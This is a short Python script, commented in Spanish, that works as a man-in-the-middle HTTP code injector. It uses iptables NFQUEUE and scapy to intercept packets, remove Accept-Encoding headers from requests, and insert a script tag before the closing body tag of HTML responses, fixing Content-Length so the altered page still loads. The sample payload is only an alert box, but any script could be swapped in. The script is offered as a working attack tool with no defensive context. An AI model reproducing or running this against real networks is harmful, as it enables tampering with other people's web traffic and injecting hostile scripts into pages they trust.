#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy
import re
##subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 8",shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 8",shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 8",shell=True)
def set_load(packet,load):
    packet[scapy.Raw].load=load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process(packet):
    ## get payload te da informacion del paquete
    scapy_packet =scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print ("HTTP Request")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
            nuevo_paquete = set_load(scapy_packet,modified_load)
            ##print (nuevo_paquete.show())
            packet.set_payload(str(nuevo_paquete))
        elif scapy_packet[scapy.TCP].sport == 80:
            print (scapy_packet.show(),"+++++++++++++++++")
            print ("HTTP Response")
            injection_code="<script> alert(''); </script> </body>"
            injec = scapy_packet[scapy.Raw].load.replace("</body>",injection_code)
            content_lenght_search=re.search("(?:Content-Length:\s)(\d*)",injec)

            if content_lenght_search and "text/html" in injec:
                content_length=int(content_lenght_search.group(1))
                new_content_lenght= content_length + len(injection_code)
                injec=injec.replace(str(content_length),str(new_content_lenght))
                print (injec,"--------------------")
            new_packet=set_load(scapy_packet,injec)
            packet.set_payload(str(new_packet))

    packet.accept()
x = netfilterqueue.NetfilterQueue()
## conect the queue 8 to the function we want to execute
x.bind(8, process)


try:

        x.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("[+] se ha interrumpido la conexion")